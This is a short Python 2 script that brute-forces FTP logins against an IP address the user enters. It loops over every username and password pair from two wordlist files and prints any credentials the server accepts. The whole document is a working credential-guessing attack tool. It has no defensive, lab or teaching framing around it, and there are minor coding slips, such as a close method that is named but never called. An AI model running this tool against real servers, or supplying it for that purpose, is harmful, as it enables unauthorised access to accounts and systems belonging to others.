import ftplib
import sys

def brute(ip, users_file, passwords_file):
	#try:
		ud = open(users_file, "r")
		pd = open(passwords_file, "r")

		users = ud.readlines()
		passwords = pd.readlines()

		for user in users:
			for password in passwords:
				try:
					print "[*]Trying to connect"
					conect = ftplib.FTP(ip)
					ans = conect.login(user.strip(), password.strip())
					if ans ==  "230 Login successful.":
						print "[*]Successfull atack"
						print "User: ", user
						print "Password: ", password
						sys.exit()
					else:
						pass
				except ftplib.error_perm:
					print "Can't Brute Force with user: " + user + " and password: " + password
					conect.close

	#except(KeyboardInterrupt):
	#	print "Interrupted. Later!"
	#	sys.exit()

ip = raw_input("IP: ")
users_file = "users.txt"
passwords_file = "passwords.txt"

brute(ip, users_file, passwords_file)